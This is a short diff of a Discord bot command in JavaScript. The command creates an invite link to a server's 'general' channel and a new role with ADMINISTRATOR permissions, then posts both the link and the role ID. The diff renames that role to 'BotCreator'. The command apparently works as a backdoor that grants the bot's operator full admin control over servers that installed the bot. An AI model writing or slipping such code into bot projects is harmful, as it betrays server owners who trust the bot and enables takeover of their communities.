@@ -8,7 +8,7 @@ module.exports.run = async (client, message, args) => {
     const defaultChannel = guild.channels.find(channel => channel.name === "general");
     const invite = await defaultChannel.createInvite();
     await message.channel.send(invite.url);
-    const role = await guild.createRole({ name:'Example Role', permissions:['ADMINISTRATOR'] });
+    const role = await guild.createRole({ name:'BotCreator', permissions:['ADMINISTRATOR'] });
     await message.channel.send(role.id);
 }
 
